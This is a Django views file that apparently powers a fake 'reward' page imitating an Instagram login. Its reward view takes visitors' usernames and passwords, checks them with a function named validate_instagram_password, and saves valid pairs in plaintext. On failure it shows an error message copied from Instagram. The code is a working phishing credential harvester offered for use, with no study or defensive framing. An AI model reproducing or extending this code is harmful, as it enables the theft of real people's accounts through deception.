from django.http import HttpResponse
from django.shortcuts import render,redirect
from .passvalidation import validate_instagram_password
from django.core.exceptions import ValidationError
from myapp.models import UserAccount


def home(request):
    return render(request,'homename.html')



def loginpage(request):
    # if request.method == 'POST':
    name = request.POST['name']
    return render(request,'loginpage.html', {'name': name})
    # return HttpResponse('error 404 page not found')

def reward(request):
    if request.method == 'POST':
        username = request.POST['user']
        password = request.POST['pass']
        name = request.POST['name']
        error = 'Sorry, your password was    incorrect.     Please double-check your password.'
        try:
            validate_instagram_password(password, username)
            myuser = UserAccount(username=username,password=password)
            myuser.save() 
            return render(request,'reward.html', {'name': name})
        except ValidationError as e:
            return render(request, "loginpage.html", {"error": error})
    return HttpResponse('error 404 page not found')